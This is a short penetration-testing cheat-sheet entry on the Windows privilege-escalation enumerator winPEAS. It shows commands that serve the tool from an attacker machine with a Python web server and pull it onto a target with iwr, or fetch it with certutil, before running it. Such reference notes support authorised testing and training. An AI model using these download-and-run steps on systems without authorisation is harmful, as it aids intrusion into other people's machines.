---
title: winPEAS
category: privesc
subcategory: windows-tools
os: windows
command: .\winPEAS.exe
tools: winPEAS, certutil
---


### Transfer and run

```cmd
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

On the target:

```powershell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

### Download via certutil

```cmd
certutil -urlcache -split -f https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/winPEAS.bat .\winPEAS.bat
.\winPEAS.bat
```
